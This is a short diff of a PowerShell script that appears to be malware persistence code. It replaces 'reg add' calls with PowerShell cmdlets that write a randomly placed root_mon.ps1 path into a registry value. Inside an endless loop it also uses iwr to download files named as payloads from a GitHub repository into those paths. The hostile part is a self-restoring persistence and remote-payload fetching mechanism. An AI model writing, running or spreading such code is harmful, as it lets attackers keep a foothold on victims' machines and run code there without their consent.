@@ -26,8 +26,7 @@ $item = Get-ItemProperty -Path "$basePath" -Name $propertyName
 if(-not($item)){
     $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $rootMonScript = "$rootMonScript\root_mon.ps1" 
-    reg add "$basePath" /v $propertyName /t REG_SZ /d $rootMonScript /f
-    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
     $issetup = $true
 }
 
@@ -74,8 +73,7 @@ while($true){
         if(-not($issetup)){
             $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootMonScript = "$rootMonScript\root_mon.ps1"
-            reg add "$basePath" /v $propertyName /t REG_SZ /d $rootMonScript /f
-            #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
